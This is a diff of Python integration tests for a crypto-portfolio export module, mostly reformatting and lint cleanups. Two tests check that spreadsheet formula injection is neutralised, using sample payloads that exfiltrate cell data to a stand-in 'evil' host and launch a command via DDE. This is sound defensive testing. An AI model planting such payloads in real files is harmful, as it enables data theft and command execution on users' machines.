@@ -18,7 +18,6 @@ Covers:
 from __future__ import annotations
 
 import csv
-import io
 import json
 import uuid
 from datetime import UTC, datetime, timedelta
@@ -45,10 +44,7 @@ pytestmark = pytest.mark.integration
 async def _insert_wallet(session: AsyncSession, address: str) -> uuid.UUID:
     wid = uuid.uuid4()
     await session.execute(
-        text(
-            "INSERT INTO wallet (id, address, label, status)"
-            " VALUES (:id, :addr, '', 'active')"
-        ),
+        text("INSERT INTO wallet (id, address, label, status) VALUES (:id, :addr, '', 'active')"),
         {"id": str(wid), "addr": address.lower()},
     )
     return wid
@@ -91,10 +87,7 @@ async def _insert_monitored_pair(
 ) -> uuid.UUID:
     mid = uuid.uuid4()
     await session.execute(
-        text(
-            "INSERT INTO monitored_pair (id, wallet_id, asset_id)"
-            " VALUES (:id, :wid, :aid)"
-        ),
+        text("INSERT INTO monitored_pair (id, wallet_id, asset_id) VALUES (:id, :wid, :aid)"),
         {"id": str(mid), "wid": str(wallet_id), "aid": str(asset_id)},
     )
     return mid
@@ -241,14 +234,10 @@ async def test_export_json_schema_version(db_session: AsyncSession) -> None:
 async def test_export_csv_schema_version(db_session: AsyncSession) -> None:
     """CSV output begins with a metadata comment that declares schema_version: 1."""
     csv_text = await render_portfolio_csv(db_session)
-    comment_lines = [l for l in csv_text.splitlines() if l.startswith("#")]
+    comment_lines = [line for line in csv_text.splitlines() if line.startswith("#")]
     assert comment_lines, "Expected at least one comment line starting with '#'"
-    schema_version_line = next(
-        (l for l in comment_lines if "schema_version" in l), None
-    )
-    assert schema_version_line is not None, (
-        "No comment line containing 'schema_version' found"
-    )
+    schema_version_line = next((line for line in comment_lines if "schema_version" in line), None)
+    assert schema_version_line is not None, "No comment line containing 'schema_version' found"
     assert "1" in schema_version_line
 
 
@@ -278,9 +267,7 @@ async def test_export_exact_value_preservation(db_session: AsyncSession) -> None
     """
     raw = Decimal("12345678901234567890")
     wallet_id = await _insert_wallet(db_session, "0x" + "7" * 40)
-    asset_id = await _insert_asset(
-        db_session, token_address="0x" + "8" * 40, symbol="BIG"
-    )
+    asset_id = await _insert_asset(db_session, token_address="0x" + "8" * 40, symbol="BIG")
     await _insert_monitored_pair(db_session, wallet_id=wallet_id, asset_id=asset_id)
     await _insert_balance_observation(
         db_session,
@@ -309,9 +296,7 @@ async def test_export_unknown_not_zero(db_session: AsyncSession) -> None:
     """A monitored wallet+asset with no balance observation exports balance as null,
     not as 0."""
     wallet_id = await _insert_wallet(db_session, "0x" + "e" * 40)
-    asset_id = await _insert_asset(
-        db_session, token_address="0x" + "f" * 40, symbol="UNK"
-    )
+    asset_id = await _insert_asset(db_session, token_address="0x" + "f" * 40, symbol="UNK")
     await _insert_monitored_pair(db_session, wallet_id=wallet_id, asset_id=asset_id)
     # Intentionally no _insert_balance_observation call.
 
@@ -334,25 +319,19 @@ async def test_export_csv_unknown_not_zero(db_session: AsyncSession) -> None:
     """CSV raw_amount cell is empty string, not '0', when no observation exists."""
     wallet_addr = "0x" + "c" * 40
     wallet_id = await _insert_wallet(db_session, wallet_addr)
-    asset_id = await _insert_asset(
-        db_session, token_address="0x" + "d" * 40, symbol="UNK2"
-    )
+    asset_id = await _insert_asset(db_session, token_address="0x" + "d" * 40, symbol="UNK2")
     await _insert_monitored_pair(db_session, wallet_id=wallet_id, asset_id=asset_id)
     # Intentionally no _insert_balance_observation call.
 
     csv_text = await render_portfolio_csv(db_session)
 
     # Strip comment lines before feeding to csv.DictReader.
-    data_lines = [l for l in csv_text.splitlines() if not l.startswith("#")]
+    data_lines = [line for line in csv_text.splitlines() if not line.startswith("#")]
     reader = csv.DictReader(data_lines)
     rows = list(reader)
 
-    match = next(
-        (r for r in rows if r.get("wallet_address", "").lower() == wallet_addr), None
-    )
-    assert match is not None, (
-        f"Expected a CSV row for wallet {wallet_addr!r}"
-    )
+    match = next((r for r in rows if r.get("wallet_address", "").lower() == wallet_addr), None)
+    assert match is not None, f"Expected a CSV row for wallet {wallet_addr!r}"
     assert match.get("raw_amount") == "", (
         "raw_amount CSV cell should be empty string, not '0', for unknown balance"
     )
@@ -383,12 +362,8 @@ async def test_export_excluded_asset_omitted(db_session: AsyncSession) -> None:
     await _insert_monitored_pair(db_session, wallet_id=wallet_id, asset_id=included_id)
     await _insert_monitored_pair(db_session, wallet_id=wallet_id, asset_id=excluded_id)
 
-    obs_included = await _insert_balance_observation(
-        db_session, wallet_id=wallet_id, asset_id=included_id
-    )
-    await _insert_balance_observation(
-        db_session, wallet_id=wallet_id, asset_id=excluded_id
-    )
+    await _insert_balance_observation(db_session, wallet_id=wallet_id, asset_id=included_id)
+    await _insert_balance_observation(db_session, wallet_id=wallet_id, asset_id=excluded_id)
 
     data = await export_current_portfolio(db_session)
     symbols = [h["asset_symbol"] for h in data.get("holdings", [])]
@@ -405,7 +380,7 @@ async def test_export_excluded_asset_omitted(db_session: AsyncSession) -> None:
 async def test_export_historical_metadata_revision(db_session: AsyncSession) -> None:
     """Each full-history record uses the asset name that was current at snapshot time,
     sourced from asset_metadata_revision."""
-    base = datetime(2026, 5, 1, 0, 0, 0, tzinfo=UTC) 
+    base = datetime(2026, 5, 1, 0, 0, 0, tzinfo=UTC)
 
     wallet_id = await _insert_wallet(db_session, "0x" + "5" * 40)
     asset_id = await _insert_asset(
@@ -500,7 +475,7 @@ async def test_export_historical_metadata_revision(db_session: AsyncSession) -> 
 async def test_export_full_history_all_snapshots(db_session: AsyncSession) -> None:
     """Full-history export includes all published snapshots, ordered by
     snapshotted_at ascending."""
-    base = datetime(2026, 6, 15, 12, 0, 0, tzinfo=UTC) 
+    base = datetime(2026, 6, 15, 12, 0, 0, tzinfo=UTC)
 
     # Insert 3 published snapshots in a non-chronological insertion order.
     ts_mid = base
@@ -535,7 +510,7 @@ async def test_export_full_history_all_snapshots(db_session: AsyncSession) -> No
 
 async def test_csv_portfolio_formula_injection_neutralized(db_session: AsyncSession) -> None:
     """Malicious token names/symbols starting with '=' are escaped in the portfolio CSV."""
-    malicious_name = "=HYPERLINK(\"http://evil\"&A1,\"click\")"
+    malicious_name = '=HYPERLINK("http://evil"&A1,"click")'
     malicious_symbol = "=cmd|'/c calc'!A0"
 
     wallet_id = await _insert_wallet(db_session, "0x" + "9" * 40)
@@ -546,9 +521,7 @@ async def test_csv_portfolio_formula_injection_neutralized(db_session: AsyncSess
         name=malicious_name,
     )
     await _insert_monitored_pair(db_session, wallet_id=wallet_id, asset_id=asset_id)
-    await _insert_balance_observation(
-        db_session, wallet_id=wallet_id, asset_id=asset_id
-    )
+    await _insert_balance_observation(db_session, wallet_id=wallet_id, asset_id=asset_id)
 
     csv_text = await render_portfolio_csv(db_session)
 
@@ -582,9 +555,9 @@ async def test_csv_portfolio_formula_injection_neutralized(db_session: AsyncSess
 
 async def test_csv_history_formula_injection_neutralized(db_session: AsyncSession) -> None:
     """Malicious token names starting with '+' are escaped in the history CSV."""
-    from audr.operations.exports import render_history_csv  # noqa: PLC0415
+    from audr.operations.exports import render_history_csv
 
-    malicious_name = "+IMPORTXML(CONCAT(\"http://evil/\",SUBSTITUTE(A1,\" \",\"%20\")),\"//\")"
+    malicious_name = '+IMPORTXML(CONCAT("http://evil/",SUBSTITUTE(A1," ","%20")),"//")'
     base = datetime(2026, 7, 1, 0, 0, 0, tzinfo=UTC)
 
     wallet_id = await _insert_wallet(db_session, "0x" + "3" * 40)
@@ -666,7 +639,7 @@ async def test_export_full_history_window_filter(db_session: AsyncSession) -> No
 
     snap_too_early = await _insert_snapshot(db_session, snapshotted_at=base - timedelta(hours=2))
     snap_in_window = await _insert_snapshot(db_session, snapshotted_at=base)
-    snap_too_late  = await _insert_snapshot(db_session, snapshotted_at=base + timedelta(hours=2))
+    snap_too_late = await _insert_snapshot(db_session, snapshotted_at=base + timedelta(hours=2))
 
     data = await export_full_history(
         db_session,
@@ -682,22 +655,34 @@ async def test_export_full_history_window_filter(db_session: AsyncSession) -> No
 
 async def test_stream_history_csv_from_filter(db_session: AsyncSession) -> None:
     """stream_history_csv(from_=T) excludes valuation lines before T."""
-    from audr.operations.exports import stream_history_csv  # noqa: PLC0415
+    from audr.operations.exports import stream_history_csv
 
     base = datetime(2026, 8, 4, 0, 0, 0, tzinfo=UTC)
     wallet_id = await _insert_wallet(db_session, "0x" + "aa" * 20)
     asset_id = await _insert_asset(db_session, token_address="0x" + "bb" * 20, symbol="FLT")
 
     snap_early = await _insert_snapshot(db_session, snapshotted_at=base - timedelta(hours=2))
-    obs_early  = await _insert_balance_observation(db_session, wallet_id=wallet_id, asset_id=asset_id)
+    obs_early = await _insert_balance_observation(
+        db_session, wallet_id=wallet_id, asset_id=asset_id
+    )
     await _insert_valuation_line(
-        db_session, snapshot_id=snap_early, wallet_id=wallet_id, asset_id=asset_id, observation_id=obs_early
+        db_session,
+        snapshot_id=snap_early,
+        wallet_id=wallet_id,
+        asset_id=asset_id,
+        observation_id=obs_early,
     )
 
     snap_later = await _insert_snapshot(db_session, snapshotted_at=base + timedelta(hours=1))
-    obs_later  = await _insert_balance_observation(db_session, wallet_id=wallet_id, asset_id=asset_id)
+    obs_later = await _insert_balance_observation(
+        db_session, wallet_id=wallet_id, asset_id=asset_id
+    )
     await _insert_valuation_line(
-        db_session, snapshot_id=snap_later, wallet_id=wallet_id, asset_id=asset_id, observation_id=obs_later
+        db_session,
+        snapshot_id=snap_later,
+        wallet_id=wallet_id,
+        asset_id=asset_id,
+        observation_id=obs_later,
     )
 
     csv_text = "".join([chunk async for chunk in stream_history_csv(db_session, from_=base)])
@@ -708,9 +693,9 @@ async def test_stream_history_csv_from_filter(db_session: AsyncSession) -> None:
 
 async def test_stream_history_csv_is_generator(db_session: AsyncSession) -> None:
     """stream_history_csv must return an async generator (not a string or coroutine)."""
-    from collections.abc import AsyncGenerator  # noqa: PLC0415
+    from collections.abc import AsyncGenerator
 
-    from audr.operations.exports import stream_history_csv  # noqa: PLC0415
+    from audr.operations.exports import stream_history_csv
 
     gen = stream_history_csv(db_session)
     assert isinstance(gen, AsyncGenerator), "stream_history_csv must return an AsyncGenerator"
